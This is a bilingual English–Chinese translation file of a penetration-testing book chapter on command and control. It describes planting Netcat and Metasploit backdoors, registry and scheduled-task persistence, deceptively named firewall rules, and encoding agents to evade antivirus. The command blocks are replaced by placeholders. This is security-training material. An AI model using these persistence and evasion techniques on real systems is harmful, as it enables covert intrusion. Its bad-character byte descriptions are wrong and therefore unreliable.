- en: '13'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '13'
- en: Command and Control
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 命令与控制
- en: Modern attackers are not interested in exploiting a system or network and then
    moving on. Instead, the goal is to attack and compromise a network of value and
    then remain resident on the network for as long as possible. **Command and control**
    (**C2**) refer to the mechanisms that testers use to replicate attacker actions
    by persisting on a system, maintaining two-way communication, enabling data to
    be exfiltrated to the tester’s location, and hiding the evidence of the attack.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 现代攻击者并不只是单纯地利用系统或网络后就离开。相反，他们的目标是攻击并入侵有价值的网络，然后尽可能长时间地保持在网络中。**命令与控制**（**C2**）指的是测试人员用来模拟攻击者行为的机制，通过在系统上保持驻留、维持双向通信、使数据能够被提取到测试者的位置，并隐藏攻击证据。
- en: In the command, control, and communication phase, the attacker relies on a persistent
    connection with the compromised system to ensure that they can continue to maintain
    their control.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在命令、控制与通信阶段，攻击者依赖于与受损系统的持久连接，以确保他们能够持续控制。
- en: 'In this chapter, you will learn about the following topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，您将学习以下内容：
- en: The importance of persistence
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 持久化的重要性
- en: Maintaining persistence with the PowerShell Empire, Covenant, PoshC2, and online
    file sharing
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用PowerShell Empire、Covenant、PoshC2和在线文件共享保持持久化
- en: Performing domain fronting techniques to maintain command and control
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 执行域前置技术以保持命令与控制
- en: The art of exfiltrating data using different protocols
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用不同协议进行数据提取的技巧
- en: Hiding the evidence of an attack
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 隐藏攻击证据
- en: Persistence
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 持久化
- en: 'To be effective, the attacker must be able to maintain **interactive persistence**;
    they must have a two-way communication channel with the exploited system (interactive)
    that remains on the compromised system for a long period of time without being
    discovered (persistence). This type of connectivity is a requirement for the following
    reasons:'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 为了有效，攻击者必须能够维持**交互式持久化**；他们必须与被利用的系统保持一个双向通信通道（交互式），并且在很长时间内不被发现（持久化）。这种连接是必需的，原因如下：
- en: Network intrusions may be detected, and the compromised systems may be identified
    and patched.
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 网络入侵可能被检测到，受损的系统可能被识别并修补。
- en: Some exploits only work once because the vulnerability is intermittent or because
    exploitation causes the system to fail or change, rendering the vulnerability
    unusable.
  id: totrans-13
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一些漏洞只能被利用一次，因为漏洞是间歇性的，或者利用时会导致系统崩溃或发生变化，导致漏洞无法继续使用。
- en: Attackers may need to return multiple times to the same target for various reasons.
  id: totrans-14
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 攻击者可能需要多次回到同一个目标，原因多种多样。
- en: The target’s usefulness is not always immediately known at the time it is compromised.
  id: totrans-15
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 目标的实际价值在被入侵时并不总是能立刻确定。
- en: The tool used to maintain interactive persistence is usually referred to by
    classic terms such as **backdoor** or **rootkit**. However, the trend toward long-term
    persistence by both automated malware and human attacks has blurred the meaning
    of traditional labels, so instead, we will refer to malicious software that is
    intended to stay on the compromised system for an extended period as a **persistent
    agent**.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 用于保持交互式持久化的工具通常被称为经典术语，如**后门**或**根工具**。然而，自动化恶意软件和人工攻击的长期持久化趋势已经模糊了传统标签的意义，因此，我们将把旨在长时间驻留在受损系统上的恶意软件称为**持久化代理**。
- en: 'These persistent agents perform many functions for attackers and penetration
    testers, including the following:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 这些持久化代理为攻击者和渗透测试人员执行多种功能，包括：
- en: Allowing additional tools to be uploaded to support new attacks, especially
    against systems located on the same network.
  id: totrans-18
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 允许上传额外的工具来支持新的攻击，尤其是针对同一网络上其他系统的攻击。
- en: Facilitating the exfiltration of data from compromised systems and networks.
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 促进从受损系统和网络中提取数据。
- en: Allowing attackers to reconnect to a compromised system, usually via an encrypted
    channel to avoid detection. Persistent agents have been known to remain on systems
    for more than a year.
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 允许攻击者重新连接到受损系统，通常通过加密通道以避免被发现。持久化代理已知能在系统中驻留超过一年。
- en: Employing anti-forensic techniques to avoid being detected, including hiding
    in the target’s filesystem or system memory, using strong authentication, and
    using encryption.
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 采用反取证技术避免被检测，包括隐藏在目标的文件系统或系统内存中、使用强身份验证以及使用加密。
- en: Using persistent agents
  id: totrans-22
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用持久化代理
- en: Traditionally, attackers would place a backdoor on a compromised system. If
    the front door provides authorized access to legitimate users, backdoor applications
    allow attackers to return to an exploited system and have access to services and
    data.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 传统上，攻击者会在被攻陷的系统上放置一个后门。如果前门提供了合法用户的授权访问，后门应用程序则允许攻击者返回到被利用的系统并访问服务和数据。
- en: Unfortunately, classic backdoors provided limited interactivity and were not
    designed to be persistent on compromised systems for very long time frames. This
    was viewed as a significant shortcoming by the attacker community because once
    the backdoor was discovered and removed, there was additional work required to
    repeat the compromise steps and exploit the system, which was made even more difficult
    by forewarned system administrators defending the network and its resources.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，经典的后门提供的交互性有限，并且并未设计为在被攻陷的系统上保持长时间的持久性。攻击者社区认为这是一个显著的缺点，因为一旦后门被发现并移除，就需要额外的工作来重复攻陷步骤并再次利用该系统，而这使得系统管理员提前防御网络和资源变得更加困难。
- en: Attackers now focus on persistent agents that are properly employed and are
    more difficult to detect. The first tool we will review is the venerable Netcat.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，攻击者将重点放在正确使用并且更难检测的持久代理上。我们将首先回顾的工具是久经考验的 Netcat。
- en: Employing Netcat as a persistent agent
  id: totrans-26
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 将 Netcat 用作持久代理
- en: Netcat is an application that supports reading from, and writing to, network
    connections using raw TCP and UDP packets. Unlike packets that are organized by
    services such as Telnet or FTP, Netcat’s packets are not accompanied by headers
    or other channel information specific to the service. This simplifies communications
    and allows for an almost universal communication channel.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: Netcat 是一个支持通过原始 TCP 和 UDP 包从网络连接中读取和写入数据的应用程序。与由 Telnet 或 FTP 等服务组织的包不同，Netcat
    的包不附带服务特定的头部或其他通道信息。这简化了通信并提供了几乎通用的通信通道。
- en: 'The last stable version of Netcat was released by Hobbit in 1996, and it has
    remained as useful as ever; in fact, it is frequently referred to as the **TCP/IP
    Swiss Army knife**. Netcat can perform many functions, including the following:'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: Netcat 的最后一个稳定版本由 Hobbit 于 1996 年发布，并且至今仍然保持其高度的实用性；事实上，它常被称为**TCP/IP 瑞士军刀**。Netcat
    可以执行许多功能，包括以下内容：
- en: Port scanning
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 端口扫描
- en: Banner grabbing to identify services
  id: totrans-30
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 横幅抓取以识别服务
- en: Port redirection and proxying
  id: totrans-31
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 端口重定向和代理
- en: File transfer and chatting, including support for data forensics and remote
    backups
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 文件传输和聊天功能，包括数据取证和远程备份支持
- en: Create a backdoor or an interactive persistent agent on a compromised system
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在被攻陷的系统上创建后门或交互式持久代理
- en: At this point, we will focus on using Netcat to create a persistent shell on
    a compromised system. Although the following example uses Windows as the target
    platform, it functions the same when used on a Unix-based platform. It should
    also be noted that most legacy Unix platforms include Netcat as part of the operating
    system.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分，我们将重点介绍如何使用 Netcat 在被攻击的系统上创建一个持久化的 shell。尽管以下示例使用 Windows 作为目标平台，但在基于
    Unix 的平台上使用时，它的功能是相同的。还应该注意的是，大多数旧版 Unix 平台将 Netcat 作为操作系统的一部分。
- en: 'In the example shown in *Figure 13.1*, we will retain the executable’s name,
    `nc.exe`; however, it is common to rename it prior to use to minimize detection.
    Even if it is renamed, it will usually be identified by antivirus software; many
    attackers will alter or remove elements of Netcat’s source code that are not required
    and recompile it prior to use. Such changes can alter the specific signature that
    antivirus programs use to identify the application as Netcat, making it invisible
    to antivirus programs:'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 在*图 13.1*所示的示例中，我们将保留可执行文件的名称 `nc.exe`；然而，在使用之前通常会将其重命名以减少被检测的风险。即使重命名，它通常也会被杀毒软件识别；许多攻击者会修改或删除
    Netcat 源代码中不需要的部分，并在使用前重新编译。这样的修改可以改变杀毒软件用来识别 Netcat 应用程序的特定签名，使其对杀毒软件来说不可见：
- en: 'Netcat is stored on Kali in the `/usr/share/windows-binaries` repository. To
    upload it to a compromised system, enter the following command from within Meterpreter:'
  id: totrans-36
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Netcat 存储在 Kali 的 `/usr/share/windows-binaries` 仓库中。要将其上传到被攻陷的系统，可以在 Meterpreter
    中输入以下命令：
- en: '[PRE0]'
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'The execution of the previous command is shown in *Figure 13.1*:'
  id: totrans-38
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 执行前述命令的过程如*图 13.1*所示：
- en: '![](../Images/B17765_13_01.png)'
  id: totrans-39
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_01.png)'
- en: 'Figure 13.1: Uploading Netcat to the target'
  id: totrans-40
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 13.1：将 Netcat 上传到目标
- en: You do not have to place it in the `system32` folder specifically; however,
    due to the number and diversity of file types in this folder, this is the best
    location for hiding a file in a compromised system.
  id: totrans-41
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 你不必专门将其放置在`system32`文件夹中；然而，由于该文件夹中包含大量文件和多种类型文件，这是在被攻陷系统中隐藏文件的最佳位置。
- en: While conducting a penetration test on one client, we identified six separate
    instances of Netcat on one server. Netcat had been installed twice by two separate
    system administrators to support network management; the other four instances
    were installed by external attackers and were not identified until the penetration
    test. Therefore, always look to see whether or not Netcat is already installed
    on your target!
  id: totrans-42
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在对一个客户进行渗透测试时，我们发现一台服务器上存在六个独立的Netcat实例。两名系统管理员分别安装了Netcat两次以支持网络管理；另外四个实例是外部攻击者安装的，在渗透测试之前未被发现。因此，务必检查目标系统中是否已经安装了Netcat！
- en: If you do not have a Meterpreter connection, you can use **Trivial File Transfer
    Protocol** (**TFTP**) to transfer the file.
  id: totrans-43
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果没有Meterpreter连接，可以使用**简单文件传输协议**（**TFTP**）传输文件。
- en: 'Next, configure the registry to launch Netcat when the system starts up, and
    ensure that it is listening on port `8888` (or any other port that you have selected,
    as long as it is not in use) using the following command:'
  id: totrans-44
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，配置注册表以便在系统启动时启动Netcat，并确保它监听`8888`端口（或任何其他未被占用的端口），使用以下命令：
- en: '[PRE1]'
  id: totrans-45
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Confirm that the change in the registry was successfully implemented using
    the following `queryval` command:'
  id: totrans-46
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用以下`queryval`命令确认注册表中的更改是否成功实施：
- en: '[PRE2]'
  id: totrans-47
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE2]'
- en: Using the `netsh` command, open a port on the local firewall to ensure that
    the compromised system will accept remote connections to Netcat. It is important
    to know the target’s operating system. The `netsh advfirewall firewall` command-line
    context is used for Windows 10, Windows Server 2008, and later versions; the `netsh
    firewall` command is used for earlier operating systems.
  id: totrans-48
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用`netsh`命令，在本地防火墙上打开端口，确保被攻陷的系统能够接受来自Netcat的远程连接。了解目标的操作系统至关重要。`netsh advfirewall
    firewall`命令行上下文适用于Windows 10、Windows Server 2008及之后版本；`netsh firewall`命令适用于早期版本操作系统。
- en: To add a port to the local Windows firewall, enter the `shell` command at the
    Meterpreter prompt and then enter `rule` using the appropriate command. When naming
    the `rule`, use a name such as `svchostpassthrough` that suggests that `rule`
    is important for the proper functioning of the system.
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要将端口添加到本地Windows防火墙，请在Meterpreter提示符下输入`shell`命令，然后使用适当的命令输入`rule`。命名`rule`时，可以使用类似`svchostpassthrough`的名称，表示此`rule`对系统的正常运行非常重要。
- en: 'A sample command is shown as follows:'
  id: totrans-50
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 示例命令如下所示：
- en: '[PRE3]'
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'Confirm that the change was successfully implemented using the following command:'
  id: totrans-52
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用以下命令确认更改是否成功实施：
- en: '[PRE4]'
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'The execution of the previously mentioned commands is shown in *Figure 13.2*:'
  id: totrans-54
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 执行前述命令的过程如*图13.2*所示：
- en: '![](../Images/B17765_13_02.png)'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_02.png)'
- en: 'Figure 13.2: Adding a firewall rule to allow the custom port'
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.2：添加防火墙规则以允许自定义端口
- en: 'When the port rule is confirmed, ensure that the reboot option works, as follows:'
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确认端口规则后，确保重启选项正常工作，如下所示：
- en: 'Enter the following command from the Meterpreter prompt:'
  id: totrans-58
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从Meterpreter提示符输入以下命令：
- en: '[PRE5]'
  id: totrans-59
  prefs:
  - PREF_IND
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'Enter the following command from an interactive Windows shell:'
  id: totrans-60
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从交互式Windows shell输入以下命令：
- en: '[PRE6]'
  id: totrans-61
  prefs:
  - PREF_IND
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE6]'
- en: To remotely access the compromised system, type `nc` at the terminal, indicate
    the verbosity of the connection (`-v` reports basic information and `-vv` reports
    much more information), and then enter the IP address of the target and the port
    number, as shown in *Figure 13.3*:![](../Images/B17765_13_03.png)
  id: totrans-62
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要远程访问被攻陷的系统，请在终端输入`nc`，指定连接的详细程度（`-v`报告基本信息，`-vv`报告更多信息），然后输入目标的IP地址和端口号，如*图13.3*所示：![](../Images/B17765_13_03.png)
- en: 'Figure 13.3: Successfully connecting to the persistent backdoor through Netcat'
  id: totrans-63
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.3：通过Netcat成功连接到持久后门
- en: Unfortunately, there are some limitations to using Netcat. There is no authentication
    or encryption of transmitted data, and it is detected by nearly all antivirus
    software.
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 不幸的是，使用Netcat存在一些局限性。传输的数据没有认证或加密，而且几乎所有的防病毒软件都会检测到它。
- en: The lack of encryption can be resolved using `cryptcat`, a Netcat variant that
    uses Twofish encryption to secure data during transmission between the exploited
    host and the attacker. Twofish encryption, developed by Bruce Schneider, is an
    advanced symmetric block cipher that provides reasonably strong protection for
    encrypted data.
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 可以使用`cryptcat`解决缺乏加密的问题，它是Netcat的一个变体，使用Twofish加密来保护在受害主机与攻击者之间传输的数据。Twofish加密是由Bruce
    Schneider开发的高级对称块密码，它为加密数据提供了合理强大的保护。
- en: 'To use `cryptcat`, ensure that there is a listener ready and configured with
    a strong password using the following command:'
  id: totrans-66
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 要使用`cryptcat`，请确保有一个监听器已准备好，并且已使用以下命令配置了一个强密码：
- en: '[PRE7]'
  id: totrans-67
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'Next, upload `cryptcat` (based on the target operating system; if it’s Windows,
    upload a Windows binary that is available in [https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release](https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release))
    to the compromised system and configure it to connect with the listener’s IP address
    using the following command:'
  id: totrans-68
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，根据目标操作系统上传`cryptcat`（如果是Windows，则上传可在[https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release](https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release)获取的Windows二进制文件）到被攻陷系统，并使用以下命令配置它连接到监听器的IP地址：
- en: '[PRE8]'
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE8]'
- en: Unfortunately, Netcat and its variants remain detectable by most antivirus applications.
    However, in case the target is a Linux system, this utility is preinstalled and
    pen testers can leverage them to open a port and run the backdoor. It is possible
    to render Netcat undetectable using a hex editor to alter the source code of Netcat.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，Netcat及其变体仍然能被大多数防病毒应用程序检测到。然而，如果目标是Linux系统，该工具会预先安装，渗透测试人员可以利用它们打开端口并运行后门。通过使用十六进制编辑器修改Netcat的源代码，可以使Netcat变得不可检测。
- en: This will help avoid triggering the signature matching action of the antivirus,
    but this can be a long trial-and-error process. A more efficient approach is to
    take advantage of Empire’s persistence mechanisms.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 这将有助于避免触发防病毒程序的签名匹配动作，但这可能是一个漫长的试错过程。更有效的方法是利用Empire的持久性机制。
- en: Using schtasks to configure a persistent task
  id: totrans-72
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用schtasks配置持久任务
- en: The **Windows Task Scheduler** (`schtasks`) was introduced as a replacement
    for `at.exe` in Windows XP and 2003\. However, `at.exe` is obsolete in the latest
    versions of Windows. In this section, we will use scheduled tasks to maintain
    persistent access to a compromised system.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: '**Windows任务计划程序** (`schtasks`) 是在Windows XP和2003中作为`at.exe`的替代品引入的。然而，`at.exe`在最新版本的Windows中已被废弃。在本节中，我们将使用计划任务来维持对被攻陷系统的持久访问。'
- en: 'Attackers can create a scheduled task on the compromised system to run the
    Empire agent payload from the attacker’s machine, and then provide backdoor access.
    `schtasks` can be scheduled directly from the command prompt, as shown in *Figure
    13.4*:'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以在被攻陷的系统上创建一个计划任务，从攻击者的机器运行Empire代理有效载荷，并提供后门访问。`schtasks`可以直接从命令提示符中安排，如*图13.4*所示：
- en: '![](../Images/B17765_13_04.png)Figure 13.4: Creating schedule tasks on the
    target for persistence'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: '![](../Images/B17765_13_04.png)图13.4：在目标上创建计划任务以保持持久性'
- en: 'The following are the typical scheduled tasks scenarios that can be engaged
    by attackers to maintain persistent access to the system:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是攻击者可以利用的典型计划任务场景，用于保持对系统的持久访问：
- en: 'To launch an Empire PowerShell agent during the user login process, run the
    following command from the command line:'
  id: totrans-77
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 要在用户登录过程中启动Empire PowerShell代理，请从命令行运行以下命令：
- en: '[PRE9]'
  id: totrans-78
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'Similarly, to launch the agent when starting the system, run the following
    command:'
  id: totrans-79
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 同样，为了在系统启动时启动代理，运行以下命令：
- en: '[PRE10]'
  id: totrans-80
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'The following command will set up to launch an agent when the system becomes
    idle:'
  id: totrans-81
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 以下命令将在系统空闲时设置启动代理：
- en: '[PRE11]'
  id: totrans-82
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE11]'
- en: Attackers will ensure that the listener is always running and open for connection.
    To legitimize it on the network, the server would need to be set up with a valid
    SSL certificate running HTTPS in order not to trigger alerts in the internal security
    features (the firewall, IPS, or proxy).
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者将确保监听器始终运行并保持连接开放。为了使其在网络中合法化，服务器需要配置一个有效的SSL证书并运行HTTPS，以避免触发内部安全功能（如防火墙、IPS或代理）的警报。
- en: 'The same task can be performed by a single-line command using the PowerShell
    Empire tools module `persistence/elevated/schtasks`, as shown in *Figure 13.5*:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 使用PowerShell Empire工具模块`persistence/elevated/schtasks`，攻击者可以通过单行命令执行相同的任务，如*图13.5*所示：
- en: '![](../Images/B17765_13_05.png)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_05.png)'
- en: 'Figure 13.5: Creating schedule tasks on the target for persistence'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 图13.5：在目标上创建计划任务以保持持久性
- en: Now that we have learned how to utilize the scheduled task to maintain persistence
    to the target, we will explore the Metasploit post exploit module.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经学会了如何利用计划任务来保持对目标的持久性，接下来我们将探讨Metasploit的后期利用模块。
- en: Maintaining persistence with the Metasploit framework
  id: totrans-88
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Metasploit框架维持持久性
- en: Metasploit’s Meterpreter contains several scripts that support persistence on
    a compromised system. We will examine the post exploit module for placing a backdoor.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit的Meterpreter包含多个支持在被攻破系统上保持持久性的脚本。我们将研究用于植入后门的后期利用模块。
- en: Using the post exploit persistence module
  id: totrans-90
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用后期利用持久化模块
- en: After a system has been exploited and the `migrate` command has moved the initial
    shell to a more secure service, an attacker can invoke the `windows/manage/persistence_exe`
    script from the Meterpreter prompt.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 在系统被利用并且`migrate`命令将初始Shell转移到更安全的服务后，攻击者可以从Meterpreter提示符下调用`windows/manage/persistence_exe`脚本。
- en: In the example shown in *Figure 13.6*, we could elect to use the `REXENAME`
    `and` `REXEPATH` options, which will start persistence when a user logs in to
    the target system.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在*图13.6*所示的示例中，我们可以选择使用`REXENAME`和`REXEPATH`选项，这将在用户登录目标系统时启动持久化。
- en: Successful implanting of the backdoor will run automatically when the system
    boots to execute the file that we have set, with a specific IP address and port.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 成功植入后门后，系统启动时将自动运行，执行我们设置的文件，并使用特定的IP地址和端口。
- en: '![](../Images/B17765_13_06.png)Figure 13.6: Placing a backdoor using Metasploit’s
    post exploit module for persistence'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: '![](../Images/B17765_13_06.png)图13.6：使用Metasploit的后期利用模块进行持久化植入后门'
- en: Note that we have arbitrarily selected a port for use by `persistence`; an attacker
    must verify the local firewall settings to ensure that this port is open or use
    the `reg` command to open the port. As with most Metasploit modules, any port
    can be selected as long as it is not already in use.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，我们已经任意选择了一个端口供`persistence`使用；攻击者必须验证本地防火墙设置，确保该端口已开放，或者使用`reg`命令打开该端口。与大多数Metasploit模块一样，只要端口未被占用，任何端口都可以被选择。
- en: 'The post exploit module’s `persistence_exe` script places an executable file
    in a temporary directory. The script also adds that file to the local autorun
    sections of the registry. Because the post exploit module, `persistence_exe`,
    is not authenticated and anyone can use it to access the compromised system, it
    should be removed from the system as soon as possible after the discovery or completion
    of penetration testing. To remove the script, confirm the location of the resource
    file for cleanup, and then execute the following resource command:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 后期利用模块的`persistence_exe`脚本将在临时目录中放置一个可执行文件。该脚本还将该文件添加到注册表的本地自动运行部分。由于后期利用模块`persistence_exe`没有认证，任何人都可以利用它访问被攻破的系统，因此在发现或渗透测试完成后，应该尽快将其从系统中移除。要移除该脚本，请确认资源文件的位置以便清理，然后执行以下资源命令：
- en: '[PRE12]'
  id: totrans-97
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: Creating a standalone persistent agent with Metasploit
  id: totrans-98
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Metasploit创建独立持久性代理
- en: 'The Metasploit framework can be used to create a standalone executable that
    can persist on a compromised system and allow interactive communications. The
    advantage of a standalone package is that it can be prepared and tested in advance
    to ensure connectivity, and encoded to bypass local antivirus software:'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit框架可以用来创建一个独立的可执行文件，使其能够在被攻破的系统上持久存在，并允许交互式通信。独立包的优势在于，它可以提前准备和测试，以确保连接性，并进行编码以绕过本地的杀毒软件：
- en: 'To make a simple standalone agent, use `msfvenom`. In the example shown in
    *Figure 13.7*, the agent is configured to use a `reverse_tcp` shell that will
    connect to the localhost at the attacker’s IP on port `443`:'
  id: totrans-100
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要制作一个简单的独立代理，可以使用`msfvenom`。在*图13.7*所示的示例中，代理配置为使用`reverse_tcp`外壳，将连接到攻击者IP的本地主机端口`443`：
- en: '[PRE13]'
  id: totrans-101
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'The agent, named `attack.exe`, will use a Win32 executable template:'
  id: totrans-102
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 名为`attack.exe`的代理将使用一个Win32可执行模板：
- en: '![](../Images/B17765_13_07.png)'
  id: totrans-103
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_13_07.png)'
- en: 'Figure 13.7: Creating a backdoor exploit to connect back to the Kali Linux
    on a specific port'
  id: totrans-104
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图13.7：创建一个后门利用程序，通过特定端口连接回Kali Linux
- en: This encodes the `attack1.exe` agent five times using the `x86/shikata_ga_nai`
    encoder. Each time it is re-encoded, it becomes more difficult to detect. However,
    the executable also increases in size.
  id: totrans-105
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该文件使用`x86/shikata_ga_nai`编码器对`attack1.exe`代理进行五次编码。每次重新编码后，检测变得更加困难。然而，可执行文件的大小也会增加。
- en: 'We can configure the encoding pattern in `msfvenom` by using `-b x64/other`
    to avoid certain characters. For example, the following characters should be avoided
    when encoding a persistent agent because they may result in the discovery and
    failure of the attack:'
  id: totrans-106
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以通过使用`-b x64/other`在`msfvenom`中配置编码模式，以避免特定字符。例如，在编码持久性代理时应避免以下字符，因为它们可能导致攻击被发现和失败：
- en: '`\x00`: Represents a 0-byte address'
  id: totrans-107
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`\x00`：表示0字节地址'
- en: '`\xa0`: Represents a line feed'
  id: totrans-108
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`\xa0`：表示换行'
- en: '`\xad`: Represents a carriage return'
  id: totrans-109
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`\xad`：表示换行符'
- en: 'To create a multi-encoded payload, use the following command:'
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
